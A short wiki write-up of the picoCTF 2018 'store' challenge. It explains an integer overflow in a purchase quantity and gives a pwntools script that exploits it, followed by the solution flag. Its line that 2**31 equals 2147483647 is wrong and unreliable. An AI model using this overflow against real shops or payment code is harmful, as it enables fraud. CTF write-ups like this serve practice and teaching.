[Category:Picoctf](/Category:Picoctf "wikilink") We started a little
store, can you buy the flag? Source. Connect with 2018shell.picoctf.com
53220.

the code did not mitigate the problem that if int32.maxvalue is sent it
is so big that it wil turn in the the negative value which sets the
price to -1000 which gives us 1000 coins.

2\*\*31 = 2147483647

`  `
`from pwn import *`
`  `
`sh = process('./store')`
`for i in range(105):`
`  `
`    sh.sendline('2')`
`    sh.sendline('1')`
`    sh.sendline('2147483647')`
`  `
`sh.interactive()`
`  `
`picoCTF{numb3r3_4r3nt_s4f3_cbb7151f}`